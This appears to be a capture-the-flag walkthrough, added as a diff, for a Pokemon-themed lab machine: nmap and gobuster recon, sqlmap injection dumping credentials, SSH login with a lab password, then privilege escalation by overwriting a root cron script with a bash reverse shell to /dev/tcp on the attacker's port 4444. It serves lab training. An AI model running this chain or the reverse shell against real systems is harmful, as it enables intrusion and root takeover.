@@ -1,0 +1,65 @@
+----------------                               ------------------
+               :::::::::::;| GOTTA CATCH'EM ALL |;::::::::::::
+
+1) DEPLOY THE MACHINE AND GET READY.
+
+TASK - 1 (RECON)
+
+1. INITIAL SCAN:
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Ports 22/SSH, 80/HTTP open"
+"Pokemon-themed website"
+
+2. WEB ENUM:
+
+    gobuster dir -u http://<ip> -w common.txt
+    "Found /pokemon/ directory"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK POKEMON PAGE:
+
+    http://<ip>/pokemon/1
+    "ID parameter vulnerable to SQLi"
+
+2. SQLMAP ATTACK:
+
+    sqlmap -u "http://<ip>/pokemon/1" --dbs
+    "Dumped admin credentials"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (SSH ACCESS)
+
+1. LOGIN WITH CREDS:
+
+    ssh ash@<ip>
+    Password: pikachu
+    "User shell obtained"
+
+2. FIND USER FLAG:
+
+    cat /home/ash/user_flag.txt
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. CHECK CRON:
+
+    cat /etc/crontab
+    "Running backup.sh as root"
+
+2. EDIT SCRIPT:
+
+    echo "bash -i >& /dev/tcp/<your_ip>/4444 0>&1" > /opt/backup.sh
+    "Wait for root shell"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- POKEMON CAUGHT ----------
